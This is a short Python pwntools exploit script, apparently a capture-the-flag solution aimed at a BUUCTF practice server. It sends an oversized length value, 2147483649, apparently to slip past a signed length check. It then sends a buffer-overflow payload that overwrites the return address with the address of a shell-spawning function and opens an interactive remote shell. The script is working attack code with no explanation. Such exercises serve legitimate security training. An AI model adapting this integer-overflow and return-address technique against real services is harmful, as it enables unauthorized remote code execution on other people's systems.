from pwn import *
io=remote('node4.buuoj.cn',26164)
bin_sh=0x400726
payload=(b'a'*0x10)+(b'a'*8)+p64(bin_sh)
io.sendlineafter('length of your name:','2147483649')
io.recvuntil('name?')
io.sendline(payload)
io.interactive()